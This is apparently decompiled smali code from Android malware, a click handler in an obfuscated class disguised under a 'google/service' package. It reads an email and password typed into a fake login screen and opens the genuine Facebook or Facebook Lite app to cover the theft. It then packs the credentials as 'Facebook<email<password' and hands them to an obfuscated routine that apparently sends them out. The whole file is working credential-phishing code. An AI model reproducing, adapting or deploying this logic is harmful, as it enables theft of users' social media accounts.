.class Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;
.super Ljava/lang/Object;
.source "\u02be\u02be\u3164\ufe76\u02ce\u02bd\u02be\u05d9\u03c6\u02bf\u02c9\u02ce\u2db1\u2db1\u02c6\u03c6\u05d9\u02ca\u0640\u02c9\u02bd4788.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;


# direct methods
.method constructor <init>(Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;)V
    .locals 0

    .line 286
    iput-object p1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 6

    const-string p1, "com.facebook.lite"

    const-string v0, "com.facebook.katana"

    .line 289
    iget-object v1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    const v2, 0x7f050011

    invoke-virtual {v1, v2}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/widget/TextView;

    .line 290
    invoke-virtual {v1}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    .line 291
    iget-object v2, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    const v3, 0x7f05002b

    invoke-virtual {v2, v3}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/TextView;

    .line 292
    invoke-virtual {v2}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 296
    :try_start_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v3

    const/4 v4, 0x5

    if-gt v3, v4, :cond_0

    const-string p1, "Please Check Your Email/Password."

    .line 298
    invoke-static {p1}, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802;->showToast(Ljava/lang/String;)V

    return-void

    .line 302
    :cond_0
    invoke-virtual {v2}, Ljava/lang/String;->length()I

    move-result v3

    const/16 v4, 0x8

    if-ge v3, v4, :cond_1

    const-string p1, "Password Must At least 8 characters."

    .line 304
    invoke-static {p1}, Lgoogle/service/θٴʼᵢʾⶱʿⶱˆˋᴵʻθˉೲᵔˎㅤㅤʾⶱʿ$ᵢˉˎᘣ4802;->showToast(Ljava/lang/String;)V

    return-void

    .line 308
    :cond_1
    sget-object v3, Lgoogle/service/ﹶˎφᘣʿᘣঙᵎʾʾθᴵ$䉀ʾʾφㅤㅤφـ47721;->appContext:Landroid/content/Context;

    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    .line 311
    iget-object v4, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-static {v4, v0, v3}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->access$600(Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v4

    const/high16 v5, 0x10000000

    if-eqz v4, :cond_2

    .line 314
    iget-object p1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-virtual {p1}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    .line 315
    invoke-virtual {p1, v5}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 316
    iget-object v0, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-virtual {v0, p1}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 319
    :cond_2
    iget-object v0, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-static {v0, p1, v3}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->access$600(Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v0

    if-eqz v0, :cond_3

    .line 322
    iget-object v0, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-virtual {v0}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    .line 323
    invoke-virtual {p1, v5}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 324
    iget-object v0, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-virtual {v0, p1}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 331
    :catch_0
    :cond_3
    :goto_0
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "Facebook<"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "<"

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    .line 333
    sget-object v0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->sfh:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v0, p1}, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->AumeVodcmCGNSRurHjuj4816(Ljava/lang/String;[B)V

    .line 334
    iget-object p1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    const/4 v0, 0x1

    iput-boolean v0, p1, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->done:Z

    .line 335
    iget-object p1, p0, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788$8;->this$0:Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-virtual {p1}, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;->finish()V

    return-void
.end method
